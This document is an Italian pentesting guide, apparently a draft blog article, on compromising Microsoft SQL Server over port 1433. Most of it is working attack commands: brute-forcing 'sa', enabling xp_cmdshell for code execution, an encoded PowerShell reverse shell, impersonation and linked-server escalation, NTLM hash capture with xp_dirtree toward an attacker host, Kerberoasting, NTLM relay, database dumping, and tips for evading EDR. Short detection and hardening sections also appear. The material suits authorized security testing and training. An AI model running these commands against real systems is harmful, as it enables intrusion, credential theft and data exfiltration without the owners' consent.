---
title: 'MSSQL Porta 1433: RCE con xp_cmdshell, Linked Server e Lateral Movement'
slug: porta-1433-mssql
description: 'MSSQL porta 1433: guida pratica al pentest di SQL Server con xp_cmdshell, linked server, Kerberoasting e tecniche reali per ottenere RCE, credenziali e movimento laterale.'
image: /mssqlù.webp
draft: true
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - porta-windows
  - ''
---

# Porta 1433 MSSQL: xp\_cmdshell, Linked Server e Compromissione Completa del Database

> **Executive Summary** — La porta 1433 è Microsoft SQL Server, il database enterprise più diffuso in ambienti Windows. MSSQL è un target ad altissimo valore: `xp_cmdshell` fornisce RCE diretto dal database al sistema operativo, i linked server permettono lateral movement tra istanze SQL, e il service account MSSQL è spesso un account di dominio con SPN (Kerberoastable). Le credenziali `sa` deboli o default, l'integrazione con AD e le stored procedure pericolose rendono MSSQL uno dei finding più impattanti in un pentest. Questa guida copre l'intera catena: dall'enumerazione all'RCE, dal privilege escalation al domain compromise.

**TL;DR**

* `xp_cmdshell` esegue comandi di sistema operativo con i privilegi del service account MSSQL
* Un service account MSSQL con SPN è Kerberoastable e può portare dal database al dominio
* I linked server permettono lateral movement tra istanze SQL e spesso abilitano escalation tramite impersonation

La Porta 1433 MSSQL è il canale TCP del protocollo TDS (Tabular Data Stream) usato da Microsoft SQL Server. La porta 1433 ha diverse vulnerabilità e severe: credenziali `sa` deboli, `xp_cmdshell` per RCE, linked server per lateral movement, NTLM relay, impersonation e data exfiltration. L'enumerazione porta 1433 rivela versione SQL Server, istanza, autenticazione (SQL auth o Windows auth), database disponibili e configurazione. Nel MSSQL pentest, un singolo accesso SQL con privilegi `sysadmin` equivale a una shell SYSTEM sul server e potenzialmente al compromesso del dominio AD. Nella kill chain si posiziona come initial access (credenziali deboli), privilege escalation (impersonation → sysadmin), lateral movement (linked server) e RCE (xp\_cmdshell).

## 1. Anatomia Tecnica della Porta 1433

| Porta        | Servizio                   | Ruolo                       |
| ------------ | -------------------------- | --------------------------- |
| **1433/TCP** | **MSSQL default instance** | **Database engine**         |
| 1434/UDP     | SQL Browser                | Discovery istanze           |
| Dynamic      | Named instance             | Porta assegnata dal browser |
| 1433         | Always On listener         | Failover cluster            |

Autenticazione MSSQL:

* **SQL Authentication**: username/password locali al database (es: `sa`)
* **Windows Authentication**: credenziali AD (Kerberos/NTLM) — il metodo preferito in enterprise
* **Mixed Mode**: entrambi — la configurazione più comune e più vulnerabile

```
Misconfig: Account sa con password debole o vuota
Impatto: accesso sysadmin → xp_cmdshell → RCE come service account
Come si verifica: mssqlclient.py sa:password@[target]
```

```
Misconfig: xp_cmdshell abilitato (o abilitabile da sysadmin)
Impatto: esecuzione comandi OS direttamente da SQL query
Come si verifica: EXEC xp_cmdshell 'whoami' — se risponde, è abilitato
```

```
Misconfig: Service account MSSQL con privilegi elevati (Domain Admin o local admin)
Impatto: xp_cmdshell esegue come il service account — se è DA, sei DA
Come si verifica: xp_cmdshell 'whoami /groups' — verifica i gruppi
```

```
Misconfig: Linked server con credenziali hardcoded
Impatto: lateral movement verso altri SQL server con privilegi diversi
Come si verifica: SELECT * FROM sys.linked_logins — rivela credenziali stored
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 1433 10.10.10.15
```

**Output atteso:**

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.0.4375.4
| ms-sql-ntlm-info:
|   10.10.10.15\MSSQLSERVER:
|     Target_Name: CORP
|     NetBIOS_Domain_Name: CORP
|     NetBIOS_Computer_Name: SQL01
|     DNS_Domain_Name: corp.local
|     DNS_Computer_Name: SQL01.corp.local
|_    Product_Version: 15.0.4375.4
| ms-sql-info:
|   Windows server name: SQL01
|   Instance name: MSSQLSERVER
|   Version: Microsoft SQL Server 2019
|_  TCP port: 1433
```

**Cosa ci dice questo output:** SQL Server 2019 sul server `SQL01.corp.local` nel dominio `CORP`. L'NTLM info rivela dominio, hostname e versione esatta — fondamentale per CVE matching e per la [catena di attacco AD](https://hackita.it/articoli/active-directory).

### Comando 2: Brute force rapido con nxc

```bash
nxc mssql 10.10.10.15 -u sa -p 'sa'
nxc mssql 10.10.10.15 -u sa -p ''
nxc mssql 10.10.10.15 -u sa -p 'Password123'
```

**Output (successo):**

```
MSSQL       10.10.10.15    1433   SQL01    [+] CORP\sa:Password123 (Pwn3d!)
```

**Lettura dell'output:** `(Pwn3d!)` indica accesso sysadmin — hai il controllo completo del database.

## 3. Enumerazione Avanzata

### Connessione e enumerazione database

```bash
mssqlclient.py sa:Password123@10.10.10.15
```

```sql
-- Database disponibili
SELECT name FROM sys.databases;

-- Utenti con ruolo sysadmin
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Service account MSSQL
SELECT service_account FROM sys.dm_server_services;

-- Linked server
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
```

**Output database:**

```
master
tempdb
model
msdb
CorpDB
HRDatabase
FinanceDB
```

**Output service account:**

```
service_account: CORP\svc_sql
```

**Lettura dell'output:** tre database custom (CorpDB, HRDatabase, FinanceDB) con dati potenzialmente sensibili. Il service account è `CORP\svc_sql` — un account di dominio. Se svc\_sql ha SPN registrato, è [Kerberoastable](https://hackita.it/articoli/kerberos).

### Enumerazione tabelle sensibili

```sql
-- Cerca tabelle con nomi sospetti in tutti i database
USE HRDatabase;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%credential%' OR TABLE_NAME LIKE '%salary%';
```

**Output:**

```
Users
Credentials
EmployeeSalary
```

```sql
SELECT TOP 10 * FROM Users;
SELECT TOP 10 * FROM Credentials;
```

**Output:**

```
| username    | password_hash                        | email              |
|-------------|--------------------------------------|--------------------|
| admin       | 0x0100A4B3C2D1E0F5...               | admin@corp.local   |
| j.smith     | 0x0100B5C4D3E2F1A6...               | j.smith@corp.local |
```

## 4. Tecniche Offensive

**xp\_cmdshell — RCE diretto**

Contesto: accesso sysadmin. xp\_cmdshell è il percorso più diretto da SQL a shell OS.

```sql
-- Abilita xp_cmdshell (se disabilitato)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Esegui comandi
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'ipconfig /all';
```

**Output:**

```
corp\svc_sql
```

**Reverse shell via xp\_cmdshell:**

```sql
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoA...';
```

```bash
# Sul Kali: nc -lvnp 9001
# Shell come CORP\svc_sql
```

**Cosa fai dopo:** hai una shell come `svc_sql`. Se è local admin: `mimikatz` per hash dump. Se è Domain User: usa le credenziali per [lateral movement](https://hackita.it/articoli/post-exploitation). Verifica privilegi: `whoami /groups` — se `BUILTIN\Administrators` è presente, sei local admin.

**Impersonation — privilege escalation dentro SQL**

Contesto: hai accesso SQL ma non sysadmin. Un utente sysadmin ha dato IMPERSONATE a un altro utente.

```sql
-- Verifica chi puoi impersonare
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

**Output:**

```
sa
```

```sql
-- Impersona sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- Ora sei sa
EXEC xp_cmdshell 'whoami'; -- RCE come service account
```

**Cosa fai dopo:** da utente low-priv a sysadmin via impersonation. Ora hai xp\_cmdshell.

**Linked server abuse**

Contesto: linked server configurato verso un altro SQL Server.

```sql
-- Lista linked server
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
```

**Output:**

```
name: SQL02
data_source: SQL02.corp.local
```

```sql
-- Esegui query sul linked server
EXEC ('SELECT SYSTEM_USER') AT [SQL02];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL02];
```

**Output:**

```
SYSTEM_USER: sa
whoami: corp\svc_sql_02
```

**Cosa fai dopo:** esecuzione su SQL02 come `sa` — lateral movement via linked server. Se SQL02 ha un service account diverso con più privilegi, hai escalato. I linked server possono formare catene: SQL01 → SQL02 → SQL03 con privilegi crescenti.

**NTLM hash capture via xp\_dirtree tramite [Responder](https://hackita.it/articoli/responder).**

Contesto: vuoi catturare l'hash NTLM del service account MSSQL senza xp\_cmdshell.

```sql
-- Forza una connessione SMB verso il tuo listener
EXEC xp_dirtree '\\10.10.10.200\share';
```

```bash
# Sul Kali: Responder in ascolto
sudo responder -I eth0
```

**Output (Responder):**

```
[SMB] NTLMv2-SSP Hash: svc_sql::CORP:a1b2c3d4:e5f6a7b8...
```

**Cosa fai dopo:** hash NTLMv2 del service account. Cracka con hashcat: `hashcat -m 5600 hash.txt rockyou.txt`. Oppure relay con ntlmrelayx verso un target senza SMB signing.

**Data exfiltration — dump database**

```sql
-- Dump tabella sensibile
SELECT * FROM HRDatabase.dbo.EmployeeSalary;
SELECT * FROM FinanceDB.dbo.Transactions WHERE amount > 10000;
```

```bash
# Via mssqlclient con output a file
mssqlclient.py sa:Password123@10.10.10.15 -windows-auth
SQL> SELECT * FROM HRDatabase.dbo.EmployeeSalary;
# Copia l'output
```

## 5. Scenari Pratici di Pentest

### Scenario 1: sa con password debole

**Step 1:**

```bash
crackmapexec mssql 10.10.10.15 -u sa -p passwords.txt
```

**Step 2:**

```bash
mssqlclient.py sa:found_pass@10.10.10.15
```

```sql
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Se fallisce:**

* Causa: sa disabilitato (best practice)
* Fix: usa Windows auth: `crackmapexec mssql 10.10.10.15 -u users.txt -p pass -d corp`

**Tempo stimato:** 5-15 minuti

### Scenario 2: Windows auth + Kerberoasting

**Step 1:**

```bash
# Trova SPN del service account SQL
GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request | grep MSSQL
```

**Output:**

```
$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/SQL01.corp.local:1433*$a1b2...
```

**Step 2:**

```bash
hashcat -m 13100 tgs_hash.txt rockyou.txt
```

**Step 3:**

```bash
mssqlclient.py corp/svc_sql:cracked_pass@10.10.10.15 -windows-auth
```

**Tempo stimato:** 15-60 minuti (crack dipende dalla password)

### Scenario 3: NTLM relay verso MSSQL

**Step 1:**

```bash
# Relay verso MSSQL
ntlmrelayx.py -t mssql://10.10.10.15 -q "EXEC xp_cmdshell 'whoami'"
```

**Step 2:**

```bash
# Forza autenticazione da un altro host
python3 PetitPotam.py [attacker_ip] 10.10.10.20
```

**Se fallisce:**

* Causa: SMB signing attivo sulla sorgente
* Fix: trova una sorgente senza signing, o usa PrinterBug

**Tempo stimato:** 5-15 minuti

## 6. Attack Chain Completa

| Fase         | Tool          | Comando                            | Risultato                   |
| ------------ | ------------- | ---------------------------------- | --------------------------- |
| Recon        | nmap          | `nmap -sV -sC -p 1433`             | Versione, dominio, hostname |
| Cred Attack  | cme           | `crackmapexec mssql -u sa -p pass` | Accesso SQL                 |
| Kerberoast   | GetUserSPNs   | `-request` sul SPN MSSQLSvc        | TGS hash                    |
| RCE          | xp\_cmdshell  | `EXEC xp_cmdshell 'cmd'`           | Shell OS                    |
| Hash Capture | xp\_dirtree   | `xp_dirtree '\\attacker\s'`        | NTLMv2 hash                 |
| Lateral Move | linked server | `EXEC ('cmd') AT [SQL02]`          | Hop tra SQL                 |
| Priv Esc     | impersonation | `EXECUTE AS LOGIN = 'sa'`          | sysadmin                    |
| Data Exfil   | SELECT        | Query tabelle sensibili            | Dati                        |

## 7. Detection & Evasion

### Blue Team

* **SQL log**: login falliti (error log), xp\_cmdshell execution
* **EDR**: powershell/cmd spawn da sqlservr.exe → alert critico
* **SIEM**: brute force su 1433, login da IP anomali

### Evasion

```
Tecnica: Ole Automation invece di xp_cmdshell
Come: sp_OACreate + sp_OAMethod — stesso risultato, meno monitorato
Riduzione rumore: EDR spesso monitora solo xp_cmdshell, non OLE
```

```
Tecnica: CLR Assembly per esecuzione codice
Come: carica un assembly .NET custom dentro SQL Server
Riduzione rumore: il codice .NET viene eseguito dentro il processo SQL — meno visibile
```

```
Tecnica: xp_dirtree per hash steal è silenzioso
Come: una query SELECT su una UNC path — nessun comando OS
Riduzione rumore: non genera gli alert di xp_cmdshell
```

## 8. Toolchain e Confronto

| Aspetto        | MSSQL (1433)       | MySQL (3306)   | PostgreSQL (5432)    | Oracle (1521)    |
| -------------- | ------------------ | -------------- | -------------------- | ---------------- |
| RCE nativo     | xp\_cmdshell       | UDF (limitato) | COPY TO PROGRAM      | Java stored proc |
| Auth Windows   | Sì (Kerberos/NTLM) | No             | No (GSSAPI limitato) | No               |
| Linked servers | Sì                 | No             | dblink               | Database links   |
| Hash steal     | xp\_dirtree        | LOAD DATA      | COPY FROM            | UTL\_HTTP        |

## 9. Troubleshooting

| Errore                       | Causa                                      | Fix                                                      |
| ---------------------------- | ------------------------------------------ | -------------------------------------------------------- |
| `Login failed for user 'sa'` | Password errata o sa disabilitato          | Prova Windows auth: `-windows-auth`                      |
| `xp_cmdshell disabled`       | Disabilitato nelle impostazioni            | Se sysadmin: `sp_configure 'xp_cmdshell', 1`             |
| `EXECUTE permission denied`  | Non sei sysadmin                           | Cerca impersonation o linked server per escalare         |
| Timeout sulla 1433           | Firewall o named instance su porta diversa | Scan porta 1434/UDP per browser, o scan range 1025-65535 |
| `Cannot open linked server`  | Linked server non raggiungibile            | Verifica network e credenziali del linked login          |

## 10. FAQ

**D: Come verificare se xp\_cmdshell è abilitato?**
R: `SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name = 'xp_cmdshell'`. Se 1 = abilitato.

**D: Posso abilitare xp\_cmdshell senza sysadmin?**
R: No. Solo sysadmin può modificare le configurazioni avanzate. Ma puoi tentare impersonation per diventare sysadmin.

**D: Il service account MSSQL è sempre Kerberoastable?**
R: Solo se ha un SPN registrato (tipicamente `MSSQLSvc/hostname:1433`). Gli account di servizio con SPN sono Kerberoastable per design.

**D: Come proteggere MSSQL sulla 1433?**
R: Disabilita sa o usa password fortissima. Preferisci Windows auth. Non dare sysadmin a utenti applicativi. Disabilita xp\_cmdshell. Service account con minimo privilegio (non Domain Admin). Firewall: limita 1433 ai soli client necessari.

## 11. Cheat Sheet Finale

| Azione         | Comando                                                  |
| -------------- | -------------------------------------------------------- |
| Scan           | `nmap -sV -sC -p 1433 [target]`                          |
| Brute sa       | `crackmapexec mssql [target] -u sa -p passwords.txt`     |
| Windows auth   | `crackmapexec mssql [target] -u user -p pass -d domain`  |
| Connect        | `mssqlclient.py sa:pass@[target]`                        |
| Connect (Win)  | `mssqlclient.py domain/user:pass@[target] -windows-auth` |
| Enable xp\_cmd | `sp_configure 'xp_cmdshell', 1; RECONFIGURE;`            |
| RCE            | `EXEC xp_cmdshell 'whoami'`                              |
| Hash steal     | `EXEC xp_dirtree '\\[attacker]\s'`                       |
| Impersonate    | `EXECUTE AS LOGIN = 'sa'`                                |
| Linked server  | `EXEC ('SELECT SYSTEM_USER') AT [LinkedServer]`          |
| Kerberoast     | `GetUserSPNs.py domain/user:pass -request`               |
| DB enum        | `SELECT name FROM sys.databases`                         |
| Table enum     | `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES`       |
| NTLM relay     | `ntlmrelayx.py -t mssql://[target]`                      |

### Perché Porta 1433 è rilevante nel 2026

MSSQL è il database enterprise dominante in ambienti Windows. xp\_cmdshell è uno dei percorsi più diretti da accesso applicativo a shell di sistema. Il Kerberoasting dei service account SQL è uno degli attacchi AD più comuni. I linked server creano percorsi di lateral movement nascosti. Le credenziali sa deboli sono ancora epidemiche. Un SQL Server compromesso spesso contiene dati business-critical (HR, finance, clienti).

### Hardening

* Disabilita o rinforza sa (password 20+ caratteri random)
* Windows Authentication Only (disabilita SQL auth se possibile)
* Service account con Managed Service Account (gMSA) — password auto-rotate
* Disabilita xp\_cmdshell, OLE Automation, CLR se non necessari
* Firewall: 1433 solo da application server, non da rete utenti
* Audit login e query con Extended Events

### OPSEC

xp\_cmdshell genera un processo figlio di sqlservr.exe — altamente visibile per EDR. Usa OLE Automation o CLR per meno rumore. xp\_dirtree per hash steal è quasi invisibile. I linked server non generano log sul server sorgente — solo sul target. Il brute force su SQL auth è loggato nell'error log.

***

Riferimento: MS-TDS, CVE database per SQL Server. Uso esclusivo in ambienti autorizzati.

> Se l'articolo ti è piaciuto e vuoi supportarci clicca pure qui. [hackita.it/supporto](https://hackita.it/supporto) — Se vuoi testare la vulnerabilità del tuo sito web o crescere in un percorso di formazione 1:1 visita la nostra pagina dedicata. [hackita.it/servizi](https://hackita.it/servizi).

## Riferimenti Esterni

* [Microsoft Learn — Server configuration: xp\_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
* [Microsoft Learn — Linked servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver16)
* [Fortra — Impacket GitHub](https://github.com/fortra/impacket)
